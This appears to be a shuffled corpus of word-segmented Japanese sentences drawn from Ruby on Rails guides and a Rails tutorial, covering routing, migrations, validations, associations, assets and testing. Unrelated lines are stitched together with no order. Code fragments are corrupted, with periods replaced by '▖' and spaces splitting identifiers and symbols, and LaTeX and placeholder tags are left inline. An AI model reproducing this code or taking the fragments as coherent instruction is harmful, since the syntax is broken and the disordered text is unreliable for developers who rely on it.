この 場合 、 “ a  user  visits  the  signin   page ” と い う 記述 は 以下 の コード に よ っ て 実装 さ れ ま す 。
先ほど の バリデーション と は 異な り 、 ファイル サイズ に 対 する バリデーション は Rails の 既存 の オプション   ( presence や length など )   に は あ り ま せ ん 。
これ は \ kode { : followers } 属性 の 場合 、 Rails が   “ followers ”   を 単数 形 に し て 自動 的 に 外部 キー \ kode { follower \ _ id } を 探 し て くれ る から で す 。
create     db /migrate/[timestamp] _create_blorgh_ articles ▖rb
上 で 示 し た 警告 に は 、 1 つ 小さな 問題 が あ り ま す 。
（ \ kode {- u } フラグ に つ い て は 気 に する 必要 は あ り ま せ ん ▟ 気 に な る の で あ れ ば   " git  set   upstream " で 検索 し て み て くださ い ） 。
       create       test/fixtures/microposts▖yml
` limit ` メソッド は 、 関連 付け を 使用 し て 取得 でき る オブジェクト の 総数 を 制限 する の に 使用 し ま す 。
この 節 の 変更 は master ブランチ で 行 う 必要 が あ り ま す 。
  { start_date:   params [ : start_date ] ,  end_ date:   params [ : end_ date ] } )
ルーティング で ` redirect ` を 使用 する と 、 ある パス を 他 の あらゆる パス に リダイレクト でき ま す 。
#   Capybara を 使用 し て い な い 場合 に も サイン イン する 。
Rails で 表示 さ せ た い 実際 の ホーム ページ の 場所 を 指定 し ま す 。
引数 で ` : method ` を 使用 し て HTTP 動詞 を 指定 する こと も でき ま す 。
定義 上 は 、 バリデーション 実行 後 に コレクション が 空 に な っ た 場合 は 有効 で す 。
改行 は 、 行 の 末尾 と 次 の 行 の 始まり を 示 し ま す 。
test ディレクトリ の 下 に は ` test/integration ` ディレクトリ が あ り ま す ▟ ここ に は エンジン の 結合 テスト が 置 か れ ま す 。
production 環境 で は 、 アセット ファイル 名 に MD 5 フィンガー プリント を 挿入 し 、 アセット ファイル が Web ブラウザ で キャッシュ さ れ る よう に し て い ま す 。
email 属性 を 小 文字 に 変換 し て メール アドレス の 一意 性 を 保証 する  
{ 0 } 図 12 ▖ 9 { / 0 }   { 1 } Relationship モデル の カラム を 入れ 替え て 作 っ た 、 フォロワー の モデル { / 1 }
belongs_to   関連 付け の 図 ] ( images/belongs_to▖ png )
たとえば 、 現在 が 2010 年 2 月 の 最後 の 日 で 、 そこ から 1 か月 と 1 日 先 に 進め た い と し ま す 。
           description :  email ▖ subject
また 、 クラウド IDE の テキスト エディタ で は 、 Ruby   on   Rails の 大きな プロジェクト に は 不可欠 と も 言 う べ き グローバル ファイル 検索 も 利用 でき ま す
#### image_tag
これ を 行 う に は 、 \ kode {microposts } テーブル の \ kode {in_reply_ to } カラム と 、 追加 の \ kode {including _ replies } スコープ を Micropost モデル に 追加 する 必要 が あ る と おも い ま す
= =    CreateMicroposts:   migrated   ( 0 ▖ 0 0 26 s )   = = = = = = = = = = = = = = = = = = = = = =
# => #< Client   id :   10 ,   first _ name :  "Ryan " >
以下 の よう に 、 数値 を 人間 に と っ て 読 み やす い バイト 数 形式 の 文字 列 に 変換 でき ま す 。
ご 想像 の とおり 、 スケーリング の 話題   ( プロファイリング 、 キャッシュ 、 バック グラウンド ジョブ など )   は RailsCasts で も たびたび 取り上げ られ て い ま す 。
詳細 に つ い て は   [ アセット パイプライン ] ( asset_pipeline ▖html )   ガイド を 参照 し て くださ い 。
\ kode {authenticated ? } に 該当 の パラメータ を 渡 す 代わり に 、 上 の よう に し ま す 。
###  Access
タイトル に ERB コード を 使用 し た Home ページ の ビュー   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
      < li ><%=   msg  %></ li >
*   アセット の 変更 を 伴 わ な い デプロイ が 頻繁 に 発生 する 。
ロック は 、 データベース の レコード を 更新 する 際 の 競合 状態 を 避け 、 アトミック な   ( = 中途 半端 な 状態 の な い )   更新 を 行な う ため に 有用 で す 。
   validates :title ,  length : {  is :   5   } , allow_blank:  true
目標 は 、 正し く な い ユーザー 登録 情報 と 正し い ユーザー 登録 情報 を 与え た とき に 、 期待 どおり に 動作 する こと を 確認 する テスト の 作成 で す 。
*   行末 に スペース を 置 か な い こと 。
User オブジェクト に \ kode { password_digest } カラム が あ る こと を 確認 する テスト 。
|                     |  428                | : precondition_required            |
この エラー を 発生 する 以下 の コード を 例 に と っ て 説明 し ま しょ う 。
後 に 作成 する サンプル アプリケーション と 同様 、 デモ アプリケーション は 、 \emph { ユーザー } と 、 それ に 関連 し て い る \emph { マイクロ ポスト } から 成り立 っ て い ま す 。
$  git   remote  add   John Smith   git://github▖ com/ John Smith /rails ▖ git
その 結果 、
Rails ルーター の 目的
この 章 で は 、 アプリケーション の レイアウト を 形 に し 、 ルーティング を 洗練 さ せ ま し た 。
match   'photos' ,  to :  'photos# show ' ,   via :   [ : get , : post ]
m  =  Object▖send(:remove_ const ,  : M )
    @ comment  = @ article ▖ comments▖ create( comment_ params )
ユーザー を 更新 する アクション
プロファイル ページヘ の リンク の 表示
記憶 トークン が 一意 に 保 た れ る こと で 、 攻撃 者 は ユーザー ID と 記憶 トークン を \emph { 両方 とも } 奪い取 る こと に 成功 し な い 限り セッション を ハイジャック でき な く な り ま す 。
    To   get  help  on this   sample  app ,  see   the
###  データベース を 設定 する
# =>   TokenGenerationException :   トークン は 空欄 に でき ま せ ん
この キャッシュ は メソッド 間 で も 共有 さ れ る こと に 注意 し て くださ い 。
   token ,  options   =  token_and _options ( controller ▖ request )
#   以上 で 、 production 環境 で は production_low_ priority と い う キュー で ジョブ が
上 の コード で は String の \ kode {upcase } メソッド を 使 っ て い ま す   ( \ ref{ sec :blocks} ) 。
マイグレーション
ここ まで で 、 CRUD の うち C と R を 実現 し ま し た 。
\ kode { admin } 属性 に 対 する テスト 。
たとえば 、 { 0 } { 1 } 図 1 ▖ 5 { / 1 } { / 0 } を もう 一 度 見 て み る と 、 コード を 80 文字 以下 に 抑え る ため の 小さな 縦線 が 右側 に 見え ま す 。
    #  surname インスタンス reader も surname =  インスタンス writer も 生成 さ れ な い
class   Player  <  ActiveRecord : : Base
#   この コード は 準備 段階 で す ▟ ╼    #
" Betelgeuse ! "
これ に 限 ら ず 、 リファクタリング を 行 う 場合 に は 、 アプリケーション の コード を 変更 する 前 と 後 で 必ず テスト を 実行 し 、 いずれ も   \ passing \   に な る こと を 確認 する よう に し て くださ い 。
C ▖ x   = :c
*  `config▖ action_controller ▖ asset_host ` は アセット を 置 く ため の ホスト を 設定 し ま す 。
長 い パス を 毎回 表記 する と 読 み づら く な る の で 、 本書 で は 以下 の よう な ディレクトリ パス を 参照 する 場合 、
もちろん 、 逆 リレーションシップ の ため に わざわざ データベース テーブル を 1 つ 余分 に 作成 する よう な こと は し ま せ ん 。
オブジェクト を ` belongs_to ` 関連 付け に 割り当て て も 、 その オブジェクト が 自動 的 に 保存 さ れ る わけ で は _ あ り ま せ ん _ 。
#   デフォルト で オン に な っ て い ま す 。
フレンド リー フォワーディング の テスト  
フッタパーシャル は 、 スタイル シート や ヘッダー パーシャル の とき と 同じ 方法 で レイアウト 中 に 追加 でき ま す   ( リスト \ ref{ code : layout_with _ footer } ) 。
#### `append `
signup ページ へ の テスト は 演習 に 回 す こと に し ま す   ( \ ref{ sec : layout _exercises} ) 。
関連 付け の 詳細 に つ い て は 、 本 ガイド の 次 の 節 で 説明 し ま す 。
Microposts リソース が 提供 する リスト \ ref{ code : demo_microposts_resource } の RESTful ルート
       create    app/helpers/users _helper▖ rb
永続 セッション から ログ アウト する
if @ supplier ▖ account▖ nil ?
記述 を 簡素 化 する ため 、 本書 で 以後 \ kode { subl } と 書 か れ て い る 箇所 は お 好み の エディタ に 読み替え て くださ い 。
" Admin : : Session " ▖ foreign_key # => " session_id "
The   max   pool   size   is   currently   5 ;   consider  increasing  it :
パスワード 再 設定 の テンプレート   ( HTML メール )
member ルーティング ブロック の 内側 で は 、 次 に 述べ る HTTP 動詞 が 指定 さ れ た ルーティング 名 を 認識 でき ま す 。
本番 Web サイト が 動作 する ため に 、 設定 ファイル の 変更 を コミット し て Heroku に プッシュ する 必要 が あ り ま す 。
* `before_enqueue `
一 度 画像 が アップロード さ れ れ ば 、 Micropost パーシャル の \ kode {image\_tag } ヘルパー で その 画像 を 描画 でき る よう に な り ま す   ( リスト \ ref{ code :micropost _ partial _ image_display } ) 。
これ ら を 手軽 に 生成 する ため に 、 Rails の scaffold ジェネレータ を 使用 し ま す 。
例 :
` collection_singular_ ids ` メソッド は 、 その コレクション に 含 ま れ る オブジェクト の id を 配列 に し た もの を 返 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : destroy_ session } に 示 し ま す 。
それ が 終わ っ た ら 、 ページ ごと に 異な る タイトル を 表示 する 、 ほんの 少し だけ 動的 な コンテンツ を 追加 し ま す 。
これ は リスト \ ref{ code :relationships_controller_ajax } で 使用 さ れ て い ま し た 。
以下 の 例 で は customer が 宣言 さ れ て い ま す 。
Object ▖qualified_const _ get ( " Math : : PI " )             # = >   3 ▖ 14159265 358 97 9 3
Client ▖ joins ( ' LEFT   OUTER   JOIN addresses  ON   addresses▖ client_ id   =  clients ▖ id ' )
この 一見 不思議 な 手法 は 「 \emph { メタ プログラミング } 」 の 最初 の 例 に な り ま す ▟ メタ プログラミング を 一言 で 言 う と 「 プログラム で プログラム を 作成 する 」 こと で す 。
    名前 空間 化 さ れ た ` ApplicationHelper ` スタブ
" blorgh " の 場合 は マウント 可能 な エンジン と し て 生成 する の で 、 ターミナル で 以下 の コマンド を 実行 し ま す 。
name :  [' John ' ,  ' Sergei' ] )
大量 の 機能 を 自動 的 に 生成 する \emph {scaffold } ジェネレータ と い う スクリプト を 使 っ て アプリケーション を すばや く 生成 し 、 それ を 元 に 高度 な Rails プログラミング と Web プログラミング の 概要 を 学 び ま す 。
# `unscope ` する 前 の オリジナル の クエリ
C ▖ x  # => :b
# => < input   id= " pass "   name = " pass " type = " password "  />
そして 以下 の ステップ ファイル で は 、 この テスト を 実装 し て い ま す 。
" foo" ▖indent ( 2 ,  "\ t " )     # => "\t\tfoo "
user▖ destroy
これ は リスト \ ref{ code : add_remember_token_to_users } で 使用 さ れ て い ま し た 。
binstubs オプション
\ texttt { byebug } を 使 っ て システム の 状態 を 調査 する こと は 、 アプリケーション 内 の エラー を 追跡 し たり デバッグ する とき に 非常 に 強力 な ツール に な り ま す 。
   included  do
development 環境 の メール 設定
リスト \ ref{ code :universal_css } の CSS の 結果 は 図 \ ref { fig : sample_app_universal } で 確認 でき ま す 。
\ href { http://mbsy▖co / 6 VQ 8l } { Code   School } :   非常 に 多種 多様 な プログラミング を 対話 的 に 学習 でき る コース
# =>  [ [ 0 ] ,   [ - 5 ] ,  [ ] , [ " foo " ,   " bar " ] ]
これ は リスト \ ref{ code :rspec _utilities_simplified } で 使用 さ れ て い ま し た 。
nick ▖ new_ record ?
###  ミドルウェアスタック を 設定 する
次 に 進 む 前 に 、 StaticPages コントローラ ファイル を Git リポジトリ に 追加 し て お き ま しょ う 。
= >  false
これ で テスト は   \ passing   に な る はず で す 。
###  アセット を プリ コンパイル する
その 後 この リンク は Sprockets  gem に よ っ て 処理 さ れ ま す 。
' Andy ' と い う 名前 の クライアント を 探 し 、 い な けれ ば 作成 し た い と し ま す 。
class  Blacklist Constraint
` humanize ` メソッド は 、 属性 名 を   ( 英語 的 に )   読 み やす い 表記 に 変換 し ま す 。
###  関連 付け の 拡張
この コード は 、 フォロー し て い る \emph { すべて の } ユーザー を メモリー から 一気 に 取り出 し 、 フォロー し て い る ユーザー の 完全 な 配列 を 作り出 し ま す 。
アカウント 有効 化 メール の プレビュー   ( テキスト バージョン )
たとえば 、 \ kode {: success } と \ kode {: error } と い う   2 つ の 状態 を 持 つ   \ kode {flash}   と い う 名前 の ハッシュ に つ い て 考え て み ま しょ う 。
最初 の パスワード テスト を パス する よう に する 。
###  form_tag
30 ▖ ▖ 50 )        # => false
この 要求 に 合 う モックアップ を 図 \ ref { fig : following _mockup}  ( フォロー し て い る ユーザー 用 )   および   図 \ ref { fig : followers_mockup}  ( フォロワー 用 )   に 示 し ま す 。
以下 の メソッド は ` active_ support/core _ext/ date_time/ calculations ▖rb ` に のみ 実装 さ れ て い ま す ▟ これ ら は ` DateTime ` インスタンス に 対 し て 使用 し な い と 意味 が な い ため で す 。
以下 の RSpec の コード で テスト でき ま す 。
デフォルト 値 は ` true ` で す 。
たとえば 、 以下 で は 3 つ の CSS ファイル を 結合 し て い ま す 。
こう し て お く と 見過ご し やす い エラー を 回避 でき る の で 、 デバッグ が 容易 に な り ま す 。
  end
  @ article   =   Article ▖find ( params [ : id ] )
  => " development "
` capitalize ` オプション を false に する と 、 冒頭 の 文字 は 大 文字 に さ れ ま せ ん ( デフォルト は true ) 。
      t▖ boolean   : single_ issue
cookies を 設定 する と 、 以後 の ページ の ビュー で 以下 の よう に し て cookies から ユーザー を 取り出せ る よう に な り ま す 。
4 行 目 は 、 \ kode { checkout } コマンド を もっと 短 い \ kode {co } と 入力 でき る よう に する ため の オプション 設定 で す 。
StaticPages コントローラ の デフォルト の テスト  
これ に 渡 さ れ る オプション は ` config▖ action_controller▖ session_options ` を 使用 し て 設定 でき ま す 。
ユーザー 入力 から 「 script 」 と い う 文字 を 除去 する の に 使用 さ れ て い る ブラック リスト が あ る と し ま しょ う 。
Rails   の ルーティング
= >   [ 42 ,   8 ,   17 ,   6 ,   7 ]
Ruby   1 ▖ 9 の ` prev_month ` メソッド と ` next _ month ` メソッド は 、 それぞれ 先月 と 翌月 の 同じ 日 を 返 し ま す 。
  >> @user
マイクロ ポスト は 、 その 所有 � 者   ( ユーザー )   と 一緒 に 破棄 さ れ る こと を 保証 する
  </tr>
#   この モジュール は 孤立 し て い る が 、 まだ 無名 で は な い
{p 0 } で 説明 し た { 2 }or { / 2 } 演算 子 { 3 } ||{ / 3 } を 使用 すれ ば 、 以下 の よう に 書 く こと が でき ま す 。
セキュリティ の ため の しくみ が まったく な い
3 ▖ ▖ 7 )    # => true
Rails で は 、 自動 的 に 上 の コード を 変換 し て 、 以下 の よう な ユーザー プロフィール ページ へ の ルーティング し ま す 。
*  `controls :  true ` は 、 ブラウザ が 提供 する 音声 ファイル 制御 機能 を 使用 でき る よう に し ま す 。
以下 の よう に 言い換え る 。
* :through
Rails で は SQLite に 代え て My SQL や Postgre SQL など を 使用 する こと も でき ま す ▟ また 、 データベース 接続 用 の プラグ イン が 多数 あ り ま す 。
3 ▖ ▖ 11 )   # => false
上 の ヘルパー は 、 ファイル の アップロード に \ texttt { 5 ▖ megabytes } など の 制限 を 与え る の に 便利 で す 。
特定 の フィールド に つ い て 、 重複 の な い 一意 の 値 を 1 レコード だけ 取り出 し た い 場合 、 ` distinct ` を 使用 でき ま す 。
いずれ の 場合 も 、 \ texttt{ ● } と い う 演算 子 が あ る とき の 「 \ texttt { x   =   x  ● y } 」 と 「 \ texttt { x  ●=  y } 」 の 動作 は 同じ で す 。
Rails で は 、 リソース フル な ヘルパー の 一般 的 など の 部分 で あ っ て も 事実 上 自由 に カスタマイズ 可能 で す 。
###   要素 を 加え る
マイグレーション の 詳細 に つ い て は [ Active   Record マイグレーション ガイド ] ( migrations ▖html ) を 参照 し て くださ い 。
( Rails の ログ に エラー が 出力 さ れ ま す が 、 害 は 生 じ ま せ ん 。
この 節 で は 、 各 関連 付け の 詳細 を 解説 し ま す ▟ 関連 付け の 宣言 に よ っ て 追加 さ れ る メソッド や オプション に つ い て も 説明 し ま す 。
*  `config ▖ asset_host ` は アセット を 置 く ホスト を 設定 し ま す 。
次 に 、 図 \ ref { fig : failed_ login_flash_ 3rd _edition } と 図 \ ref { fig : flash_persistence _ 3rd _edition } の 手順 を テスト コード で 再現 する 必要 が あ り ま す 。
逆 に 、 オブジェクト が 何 を \emph { する } か を 説明 する の は 簡単 で す ▟ オブジェクト と は   ( いつ いかなる 場合 に も )   メッセージ に 応答 する もの で す 。
d ▖ beginning _ of_month     # =>  Sat ,   0 1   May  2010
       create    app/views/static _ pages
* ` ActionDispatch : : SSL ` は すべて の リクエスト に HTTPS プロトコル を 強制 し ま す 。
今度 は コメント 作成 部分 も パーシャル に 追い出 し て み ま しょ う 。
NOTE :   ここ で サポート さ れ て い る 記法 は 、 `/` で 区切 る 「 ディレクトリ 式 」 のみ で す 。
以下 の コード を ` app/views/articles/new▖html ▖erb ` に 追加 し て 、 ` form _ for ` メソッド を 使用 でき る よう に し ま しょ う 。
< div>
*  `config▖ action_controller ▖relative_url_ root ` は 、 [ サブ ディレクトリ へ の デプロイ ] ( configuring ▖ html # サブ ディレクトリ に デプロイ する - 相対 url ルート の 使用 ) を 行 う こと を Rails に 伝え る ため に 使用 でき ま す 。
この 時点 で 以下 を 実行 する と 、 テスト スイート が 赤色   ( 失敗 )   に な る はず で す 。
        mail ▖ delivery _ method▖ settings ▖ merge ! (
デフォルト は ` nil ` で あ り 、 この 場合 ` active_ support/all ` は 読み込 ま れ ま す 。
同じ 変更 を もっと 高速 かつ 素晴らし い 方法 で 実装 する 方法 を 思い付け る か 。
関連 付け られ た レコード が 存在 し て は な ら な い 場合 、 これ を 検証 する に は ` : inverse _of ` オプション で その 関連 付け を 指定 する 必要 が あ り ま す 。
43 ,   44 ,   45 ,   46 ,   47 ,   48 ,   49 ,  50 ,   51
* `:nullify ` を 指定 する と 、 外部 キー は すべて ` NULL ` に 設定 さ れ ま す 。
< h 3 > Comments</ h 3 >
` camelize ` は ` camelcase ` の 別名 で す 。
╼   end
*  `config▖ action _mailer▖ raise_ delivery _errors ` は 、 メール の 配信 が 完了 し な かっ た 場合 に エラー を 発生 さ せ る か どう か を 指定 し ま す 。
実 は 、 \ kode {bun dle } コマンド は \ kode {bun dle  install } の エイリアス で も あ り ま す 。
アカウント 有効 化 メイラー の HTML ビュー   ( 自動 生成 )
この ポスト は 、 宛先 の ユーザー の フィード と 、 自分 を フォロー し て い る ユーザー に のみ 表示 さ れ ま す 。
集合 と し て は 任意 の enumerable オブジェクト が 使用 でき ま す 。
<%  if @customer▖ orders▖empty?  
データベース に カラム を 作成 する とき 、 その カラム で レコード を \emph { 検索 する   ( find )   } 必要 が あ る か どう か を 考え る こと は 重要 で す 。
*   X - XSS - Protection
この 実行 順序 に は 意味 が あ り ま す ▟ 極端 な ケース で は 、 順序 が 変わ る と 計算 結果 も 異な る 場合 が あ り ま す 。
これ ら の ヘルパー は 、 共通 の バリデーション ルール を 提供 し ま す 。
*  `config▖i 18n ▖load _ path ` は 、 ロケール ファイル の 探索 パス を 設定 し ま す 。
この ヘルパー は 、 与え られ た 集合 に 属性 の 値 が 含 ま れ て 「 い な い 」 こと を 検証 し ま す 。
有効 な ユーザー 登録 に 対 する テスト   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
   def welcome_email ( user )
ラジオ ボタン を 作成 し ま す ▟ ユーザー が 同じ オプション グループ 内 から 選択 でき る よう 、 同じ name 属性 で ラジオ ボタン を グループ 化 し て くださ い 。
*  `config▖ active_ record ▖ primary _key_ prefix_type ` は 、 主 キー カラム の 命名 法 を 変更 する の に 使用 し ま す 。
   queue _as  :low_ priority
さらに 、 ユーザー が レビュー の タイトル に 細工 を し て 、 悪意 の あ る HTML を タイトル に 含め れ ば 、 巨大 な セキュリティ ホール に な る こと すら あ り ま す 。
|   GET        | /photos/:id/edit  |  photos#edit        |  写真 編集 用 の HTML フォーム を 1 つ 返 す       |
\ kode { name } 属性 の 存在 性 を 検証 する
残 る 制約 は 、 メール アドレス が 一意 で あ る こと を 強制 する こ だけ と な り ま し た 。
作成 し た コード を リスト \ ref{ code : signup _ form } に 示 し ま す
この チュートリアル で は ほとんど の 作業 を ` app ` ディレクトリ で 行 い ま す が 、 Rails が 生成 し た ファイル と フォルダ に つ い て ここ で 簡単 に 説明 し て お き ま す 。
#     <message> Kill  AMo observing   wrap_with _notifications   since   ARes  was  only   u sing  it< / message>
この モデル も 名前 空間 化 さ れ る の で 、 ` Engine ` クラス 内 の isolate_namespace ` 呼び出し に よ っ て 、 ` app/models/article ▖ rb ` で は な く ` app/models/blorgh/article ▖ rb ` に 置 か れ ま す 。
##### `: primary _key`
Rails   4 ▖ 0 に アップグレード する と 、 ヘルパー は 読み込 ま れ た ディレクトリ の 順序 を 保持 し 、 ソート は 各 ディレクトリ 内 で のみ 行 わ れ ま す 。
変更 結果 を リスト \ ref{ code : home_root _ route } に 示 し ま す ▟ ここ で は 、 リスト \ kode {hello} の \ kode { get }   ルール を 以下 の コード に 置き換え て い ま す 。
*   Rails   4 ▖ 0 の ` serialized_attributes ` メソッド と ` attr_readonly ` メソッド は 、 クラス メソッド と し て のみ 使用 する よう に 変更 さ れ ま し た 。
    end▖ bind (object )
この メソッド に は 破壊 的 な バージョン の ` String # squish ! ` も あ り ま す 。
Article ▖ w here ( published:  true ) ▖ many?
    mail
設定 が 無事 に 終わ っ た ら 、 これ まで の 変更 を コミット し たり デプロイ する 準備 が 整 い ま し た 。
C ▖ x  # => :a
条件 で 使用 する 数値 が 変動 する 可能 性 が あ る 場合 、 引数 を どの よう に すれ ば よ い で しょ う か 。
サンプル アプリケーション の 開発 で は 、 「 モックアップ 」 「 テスト 駆動 開発   ( TDD ) 」 「 統合 テスト 」 の 3 つ の 手法 を 採り入れ ま す ▟ \emph {}\emph {}\emph {}
特定 の 属性 に アクセス する ため の 、 種類 が " date " の input タグ を 返 し ま す 。
さらに 、 ` cd  ▖▖ && rails   new blog  -- database =mysql ` の よう に する と ジェネレータ を 繰り返 し 実行 する こと も でき ま す 。
以前 の Rails で は データ の 更新 に HTTP の \ texttt { PUT } リクエスト を 使用 し て い ま し た が 、 HTTP 標準 に 従 え ば \ texttt { PATCH } リクエスト の 方 が 適切 で す 。
で は 、 ビュー は どの よう に 出力 さ れ る の で しょ う か ▟ また 、 どの ビュー が 表示 さ れ る の で しょ う か 。
{ 0 } 図 9 ▖ 3 { / 0 }   { 1 } 更新 フォーム の 送信 で 発生 し た エラー メッセージ ▟ { / 1 }
     format ▖ json_patch   do
この sqlite 3 と い う gem の バージョン を 指定 する 主な 方法 は 2 通り あ り ま す ▟ これ に よ り 、 Rails で 使用 さ れ る gem の バージョン を 「 ある 程度 」 制御 でき ま す 。
###  アプリケーション の ホーム ページ を 設定 する
 *   This   is   a  manifest  file  that'll  automatically  include  all  the stylesheets
The  \ kode { current\ _user ? }  
具体 的 に は 、 レシーバ の ハッシュ キー に 対 し て ` to_sym ` を 送信 し て い ま す 。
WARNING :   独自 の ` select ` メソッド を 使用 する 場合 に は 、 関連 付け られ て い る モデル の 主 キー カラム と 外部 キー カラム を 必ず 含め て お い て くださ い 。
*  `asset -url( " rails ▖ png " ) ` は `url(/assets/rails ▖ png ) ` に 変換 さ れ る
開発 環境 の コンピュータ に My SQL が インストール さ れ て お り 、 ユーザー 名 root 、 パスワード なし で 接続 でき る の で あ れ ば 、 上 の 設定 で 接続 でき る よう に な る はず で す 。
   " TrueClass "   => " boolean " ,
<%=  comment_counter   +   1   %>▖ <%=  comment▖ text   %>
要 する に \ kode { create } アクション の 中 で は 、 ユーザー の 認証 に 必要 な あらゆる 情報 を \ kode { params } ハッシュ から 簡単 に 取り出せ る と い う こと で す 。
リクエスト で 送信 さ れ た ` JSON ` ベース の パラメータ が どの よう に 見え る か を 以下 の 表 に 示 し ま す 。
` http://local host : 3000 / blorgh/articles ` を ブラウザ で 表示 する と 、 生成 さ れ た デフォルト の scaffold が 表示 さ れ ま す 。
この リクエスト は ` patients ` コントローラ の ` show ` アクション に 割り当て られ 、 ` params ` に は `{   id :  ' 17 '  }` ハッシュ が 含 ま れ て い ま す 。
` : as ` を 使用 する と 、 ネスト し た ルーティング ヘルパー 内 の リソース 用 に 自動 生成 さ れ た 名前 を オーバーライド でき ま す 。
ここ で の ねらい は 、 ブラウザ に この base 64 トークン を 保存 し て お き 、 データベース に は トークン を 暗号 化 し た もの を 保存 する こと で す 。
Ruby   on   Rails の テスト で 警告 が ひと つ も 表示 さ れ な い の が 理想 で す が 、 サード パーティ の もの も 含め て 若干 の 警告 が 表示 さ れ て しま う こと が あ り ま す 。
2 つ 目 の 方法 は ` find_ in_batches ` メソッド を 使用 する 方法 で す ▟ レコード の バッチ を 1 つ 取り出 し 、 次 に   _ バッチ 全体 _   を モデル の 配列 と し て ブロック に yield し ま す 。
Sprockets で は 、 どの アセット を インク ルード し て サポート する か を 指定 する の に マニフェスト ファイル を 使用 し ま す 。
# bun dle   exec   rake   doc: rails   generates  the   API un der  doc/api▖
{ nil  => nil ,   1   = >   1 ,   a : : a} ▖transform _keys { |key|  key▖ to_s ▖upcase   }
` : disabled ` を 指定 する と 、 Rails で セッション が 扱 わ れ な く な り ま す 。
コマンド の 多 さ に 圧倒 さ れ がち で す が 、 すべて の コマンド を 今 覚え る 必要 は まったく あ り ま せ ん の で 、 心配 は 無用 で す 。
< li >`: domain` -  HELO ドメイン を 指定 する 必要 が あ る 場合 は ここ で 行な う ▟</ li >
この 節 で 提案 する さまざま な 拡張   ( パスワード リ マインダ 、 メール に よ る 確認 、 サンプル アプリケーション 向け に は 検索 、 返信 、 メッセージング など )   は 、 ほとんど が Web アプリケーション で 一般 的 な 機能 で す 。
* `image -url( " rails ▖ png " ) ` は `url(/assets/rails ▖ png ) ` に 変換 さ れ る
      t▖ string   : commenter
Rails   development  box を 利用 でき な い 事情 が あ る 場合 は 、 Rails ガイド の [ Rails コア 開発 環境 の 構築 方法 ] ( development_dependencies_ install▖html ) を ご覧 くださ い 。
####  すべて の コア 拡張 機能 を 読み込 む
ユーザー 登録 で は 最初 に ユーザー を 作成 し ま し た が 、 ログ イン で セッション を 作成 する 場合 に 最初 に 行 う の は 、 入力 が \emph { 無効 な } 場合 の 処理 で す 。
この テクニック を 学 ん だ こと で 、 基本 と な る メール アドレス フォーマット 検証 の テスト を 書 く 準備 が 整 い ま し た 。
この 警告 は \ ref{ sec : professional_grade_deployment } で 解決 する 予定 で す ) 。
ユーザー の マイクロ ポスト 表示 に 対 する テスト 、 すなわち ユーザー に 対 する request   spec を 作成 する ところ から 始め ま しょ う 。
now▖ seconds_ since_ mid night # = >   735 9 6
この タグ で 選択 さ れ た 項目 は 、 Active   Record オブジェクト に マルチ パラメータ と し て 割り当て 可能 な 形式 に な り ま す 。
#### `instance_ variable_names`
###  Postgre SQL の データ 型 ' json' と 'hstore ' に つ い て
` id ` 以外 に 以下 の 2 つ を 指定 でき ま す 。
この 問題 を 解決 する ため に 、 \ ref{ sec :a_gravatar _ image } で 最小 限 の プロファイル ページ を 作成 する 予定 で す 。
作成 し た コード を リスト \ ref{ code :utility _ method_tests } に 示 し ま す
レイアウト も スタイル も 設定 さ れ て い な い
   <option   value = " 1 "   selected=" selected " > D ▖   Heinemeier   Hansson< /option >
Mon ,   09   Aug  2010   23 : 59 : 59   UTC   + 0 0 : 0 0
<% @books ▖each   do  | book | %>
この よう な 動作 は 、 RSpec で \ kode {expect } メソッド を \ kode {to } メソッド また は   \ kode { not_to } メソッド と 組み合わせ て 実現 でき ま す 。
config ▖ assets▖ paths <<  Rails ▖ root ▖ join ( " lib " ,   " videoplayer " ,   " flash " )
上 の コード は 、 配信 さ れ た メッセージ が きっかり 1 つ で あ る か どう か を 確認 し ま す 。
class   Paragraph <  ActiveRecord : : Base
チェック ボックス を 追加 し た モックアップ を 図 \ ref { fig: login_remember_me_mockup } に 示 し ま す 。
マニュアル など 、 アプリケーション の ドキュメント
SQL の ` IN ` 式 を 使用 し て レコード を 検索 し た い 場合 、 条件 ハッシュ に その ため の 配列 を 1 つ 渡 す こと が でき ま す 。
Rails 内外 の 様々 な ミドルウェア を 結合 し て 、 完全 な Rails の Rack アプリケーション を 作 る ため に 、 ` Rails : : Application ` は ` ActionDispatch : :MiddlewareStack ` を 使用 し て い ま す 。
` capture ` メソッド を 使用 する こと で 、 テンプレート の 一部 を 変数 に 保存 する こと が でき ま す 。
= > #< StaticPages Controller : 0 x 22855 d 0 >
これ に よ り 、 クライアント コード で 以下 の よう な ダック タイピング チェック を 行な う こと が でき ま す 。
*  `config ▖ assets▖enabled ` は 、 アセット パイプライン を 有効 に する か どう か を 指定 し ま す 。
今度 は ` app/controllers/ comments_controller▖ rb ` の ` create ` アクション を 改造 し ま しょ う 。
ただし この Gem は 将来 使え な く な る か も しれ ま せ ん 。
    xml ▖ p (@ person ▖ bio)
      <div  id= " content " ><%=  content_ for ? (:content )   ?  
//= require   projects
次 に 、 新し く 定義 さ れ た 名前 付き ルート を 使 っ て 、 Home ページ の ボタン に 適切 な リンク を 追加 す 。
( \ ref{ sec :a_test _ for_ valid _ submis sion } で 書 く テスト で も 、 ここ で 生成 し た ファイル を 使 い ま す )
      xml ▖ language   " en -us "
レシーバ が ` convert_key ` に 応答 する 場合 、 キー は 正規 化 さ れ ま す 。
フォロー する 相手 を 見つけ る
リスト \ ref{ code : from _users _ followed_ by _ second_ cut } で コード を 若干 修正 し 、 フィード を リファクタリング する こと から 始め ま しょ う 。
これ で 1 つ の 問題 が 解決 さ れ ま し た が 、 メール アドレス の 一意 性 を 保証 する ため に は 、 もう 1 つ や ら な けれ ば な ら な い こと が あ り ま す 。
DELETE  /photos/ 17
重複 を 取り除 く テクニック の 一 つ と し て 、 ビュー で \emph { 埋め込 み Ruby }  ( Embedded  Ruby )   を 使用 でき ま す 。
1 つ の ルーティング に つ い て 以下 の 情報 が 表示 さ れ ま す 。
Help ページ に つ い て も 、 Home ページ の 例 を 参考 に し て 、 同じ よう な テスト と アプリケーション コード を 使用 でき る こと が 推測 でき ま す 。
上 の コマンド に よ り 、 Cucumber 関連 の ファイル が 置 か れ る \ kode {features/} ディレクトリ が 作成 さ れ ま す 。
以下 に 例 を 示 し ま す 。
User の データ モデル の スケッチ
